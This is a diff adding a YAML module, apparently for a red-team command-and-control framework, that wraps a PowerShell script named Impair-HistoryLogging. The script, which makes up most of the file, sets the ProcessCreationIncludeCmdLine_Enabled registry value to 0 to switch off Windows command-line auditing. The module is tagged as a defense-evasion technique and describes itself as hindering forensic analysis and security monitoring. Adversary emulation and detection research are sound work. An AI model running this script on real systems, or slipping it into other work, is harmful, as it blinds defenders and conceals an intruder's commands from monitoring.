@@ -1,0 +1,55 @@
+name: Impair-HistoryLogging
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Disables Windows command line auditing by modifying the
+  ProcessCreationIncludeCmdLine_Enabled registry value. When command
+  line auditing is enabled, the system records detailed information
+  about command execution including the command, the user account,
+  and the timestamp. Disabling this prevents new process creation
+  events from including command line arguments, hindering forensic
+  analysis and security monitoring.
+software: ''
+tactics: [TA0005]
+techniques: [T1562.003]
+background: true
+output_extension:
+needs_admin: true
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Impair-HistoryLogging {
+      $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"
+
+      # Create the registry path if it does not exist
+      if (-not (Test-Path $regPath)) {
+          New-Item -Path $regPath -Force | Out-Null
+          Write-Output "[+] Created registry path: $regPath"
+      }
+
+      # Disable command line auditing
+      New-ItemProperty -Path $regPath -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore | Out-Null
+
+      # Verify
+      $val = (Get-ItemProperty -Path $regPath -Name "ProcessCreationIncludeCmdLine_Enabled" -ErrorAction SilentlyContinue).ProcessCreationIncludeCmdLine_Enabled
+      if ($val -eq 0) {
+          Write-Output "[+] Command line auditing disabled successfully."
+          Write-Output "[+] ProcessCreationIncludeCmdLine_Enabled set to 0."
+      } else {
+          Write-Output "[-] Failed to disable command line auditing."
+      }
+  }
+script_end: Impair-HistoryLogging {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
